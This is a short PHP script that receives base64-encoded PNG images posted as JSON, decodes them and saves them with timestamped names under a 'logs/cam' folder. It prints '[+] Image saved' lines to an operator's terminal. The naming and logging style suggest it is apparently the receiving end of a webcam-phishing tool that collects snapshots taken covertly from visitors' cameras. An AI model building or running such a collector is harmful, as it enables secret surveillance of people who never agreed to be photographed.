<?php

$data = json_decode(file_get_contents("php://input"));

$image = $data->image;

$image = str_replace("data:image/png;base64,", "", $image);
$image = str_replace(" ", "+", $image);

$img = base64_decode($image);

$filename = time().".png";

$file = "../../logs/cam/".$filename;

file_put_contents($file,$img);


#################################
# terminal log output
#################################

$date = date("Y-m-d H:i:s");

echo "[+] Image saved: $filename at $date\n";

?>